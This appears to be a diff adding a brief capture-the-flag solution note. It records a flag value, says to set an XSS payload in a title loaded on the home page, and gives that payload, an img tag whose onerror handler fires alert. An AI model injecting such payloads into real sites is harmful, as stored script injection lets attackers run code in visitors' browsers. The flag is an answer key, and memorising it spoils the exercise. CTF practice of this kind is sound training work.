@@ -1,0 +1,4 @@
+^FLAG^6b914bded6249dbfc75b9e9c242c37c3f72a43ee99abbf83a819d82eaf79afba$FLAG$
+
+Set XSS for title which gets loaded on the home page - alert contains flag.
+<img src="" onerror=alert(1) />
